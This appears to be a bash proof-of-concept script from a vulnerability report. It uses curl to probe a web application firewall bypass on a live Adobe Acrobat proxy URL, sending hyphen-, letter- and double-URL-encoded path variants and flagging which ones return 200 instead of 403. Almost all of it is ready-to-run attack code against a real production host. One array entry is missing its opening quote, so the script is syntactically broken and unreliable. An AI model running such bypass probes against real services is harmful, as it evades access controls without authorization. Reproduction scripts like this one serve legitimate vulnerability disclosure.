#!/bin/bash
# Adobe Acrobat WAF Bypass Proof of Concept
# VULN-32810 - For reproduction verification only

echo "=================================================="
echo "Adobe Acrobat WAF Bypass Reproduction Test"
echo "VULN-32810: WAF Bypass via URL Encoding"
echo "=================================================="
echo ""
echo "Test Timestamp: $(date)"
echo ""

# Test endpoint
ENDPOINT="https://acrobat.adobe.com/proxy/pdfverbs-web/3.37.0_4.1167.0/shared-storage.html"
BYPASS_ENDPOINT="https://acrobat.adobe.com/proxy/pdfverbs-web/3.37.0_4.1167.0/shared%2dstorage.html"

echo "Test 1: Normal Request (Expected: 403 Forbidden)"
echo "URL: $ENDPOINT"
echo ""
curl -i -s "$ENDPOINT" | head -15
echo ""
echo "=================================================="
echo ""

echo "Test 2: Bypassed Request with %2d encoding (Expected: 200 OK)"
echo "URL: $BYPASS_ENDPOINT"
echo ""
curl -i -s "$BYPASS_ENDPOINT"
echo ""
echo "=================================================="
echo ""

# Summary
NORMAL_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$ENDPOINT")
BYPASS_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$BYPASS_ENDPOINT")

echo "SUMMARY:"
echo "  Normal Request Status:  $NORMAL_STATUS"
echo "  Bypass Request Status:  $BYPASS_STATUS"
echo ""

if [ "$NORMAL_STATUS" = "403" ] && [ "$BYPASS_STATUS" = "200" ]; then
    echo "✅ BYPASS CONFIRMED - Vulnerability is reproducible!"
    echo ""
    echo "The WAF blocks the normal URL but allows the encoded version."
    echo "This proves the URL encoding bypass works."
else
    echo "❌ Test results unexpected - may be patched or network issue"
fi

echo ""
echo "=================================================="
echo "Additional Test: Multiple Encoding Techniques"
echo "=================================================="
echo ""

declare -A tests=(
    ["Normal path"]="shared-storage.html"
    ["Hyphen encoded (%2d)"]="shared%2dstorage.html"
    ["Double encoded (%252d)"]="shared%252dstorage.html"
    ["'h' encoded (%68)"]="s%68ared-storage.html"
    ["'s' encoded (%73)"]=%73hared-storage.html"
)

for name in "${!tests[@]}"; do
    path="${tests[$name]}"
    url="https://acrobat.adobe.com/proxy/pdfverbs-web/3.37.0_4.1167.0/$path"
    status=$(curl -s -o /dev/null -w "%{http_code}" "$url")

    if [ "$status" = "200" ]; then
        echo "[$name]: $status ✅ BYPASS WORKS"
    elif [ "$status" = "403" ]; then
        echo "[$name]: $status ❌ Blocked"
    else
        echo "[$name]: $status ⚠️  Unexpected"
    fi
done

echo ""
echo "=================================================="
echo "Test Complete"
echo "=================================================="
